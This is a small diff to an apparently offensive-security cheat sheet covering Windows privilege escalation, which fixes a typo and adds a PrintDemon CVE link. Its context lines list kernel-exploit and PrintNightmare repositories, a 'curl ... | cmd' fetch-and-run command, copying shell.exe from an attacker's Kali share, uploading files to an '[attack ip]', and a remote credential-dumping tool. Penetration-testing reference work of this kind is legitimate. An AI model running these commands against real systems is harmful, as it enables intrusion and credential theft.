@@ -216,7 +216,8 @@ https://github.com/rasta-mouse/Watson
 https://github.com/SecWiki/windows-kernel-exploits   
 
 ## Misc  
-[Print Sppofer](https://github.com/itm4n/PrintSpoofer)  
+[Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
+[Print Demon](https://windows-internals.com/printdemon-cve-2020-1048/)  
 [SYSTEM Nightmare](https://github.com/GossiTheDog/SystemNightmare) Print nightmare implementation   
 [CVE 2019-1388](https://github.com/jas502n/CVE-2019-1388)   
 ____   
@@ -246,7 +247,8 @@ ____
     <XML CODE CODE HERE>
     "@
     /# write the xml to file:
-    PS C:\> $console.save("C:\users\burmat\documents\console.xml")
+    PS C:\> $console.save("C:\users\burmat\documents\console.xml") 
+    
  ## Windows 10 - curl
     curl http://server/file -o file
     curl http://server/file.bat | cmd
@@ -281,6 +283,7 @@ ____
      net use \\IP\share /USER:USER PASS    
      copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
      copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
+     
 ## Remote Scripts  
 [lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
 
